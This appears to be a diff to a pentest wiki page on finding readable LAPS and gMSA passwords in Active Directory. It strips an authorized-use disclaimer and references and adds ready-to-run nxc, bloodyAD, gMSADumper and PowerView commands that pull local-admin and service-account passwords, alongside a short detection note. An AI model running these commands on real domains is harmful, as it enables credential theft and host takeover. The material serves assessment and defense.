@@ -10,24 +10,31 @@ mitre: "T1552"
 tag: null
 ---
 
+
 # LAPS / gMSA readable-password discovery
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **`ms-Mcs-AdmPwd` / `msLAPS-Password`** (LAPS) and **`msDS-ManagedPassword`** (gMSA).
 
-## Detection
+### Concept (deep)
+LAPS stores per-host local admin passwords in AD; gMSA stores a managed password blob. Read access to either = **host admin** or **service-account compromise**.
+
+### Exhaustive commands
+```bash
+# ── LAPS read ────────────────────────────────────────────────────────
+nxc ldap dc.corp.local -u lowpriv -p 'Password123!' -M laps
+bloodyAD -d corp.local -u lowpriv -p 'Password123!' \
+  get object 'CN=WS01,CN=Computers,DC=corp,DC=local' --attr ms-Mcs-AdmPwd
+
+# ── gMSA read ────────────────────────────────────────────────────────
+nxc ldap dc.corp.local -u lowpriv -p 'Password123!' --gmsa
+python3 gMSADumper.py -u lowpriv -p 'Password123!' -d corp.local
+
+# ── PowerView ACL check ─────────────────────────────────────────────
+Get-DomainObjectAcl -LDAPFilter '(ms-mcs-AdmPwdExpirationTime=*)' -ResolveGUIDs
+```
+
+### Detection
 **4662** reads of `ms-Mcs-AdmPwd`/`msDS-ManagedPassword`; delegate LAPS read to a narrow group; use Windows LAPS encryption.
 
 ---
-
-## References
-
-- [Microsoft: Credential Guard](https://learn.microsoft.com/windows/security/identity-protection/credential-guard/credential-guard)
-- [Microsoft: Credential protection](https://learn.microsoft.com/windows-server/security/credentials-protection-and-management/credential-protection-and-management)
-- [Microsoft: Active Directory Domain Services](https://learn.microsoft.com/windows-server/identity/ad-ds/)
-- [Microsoft: Security auditing](https://learn.microsoft.com/windows/security/threat-protection/auditing/security-auditing-overview)
-- [MITRE ATT&CK: T1552](https://attack.mitre.org/techniques/T1552/)
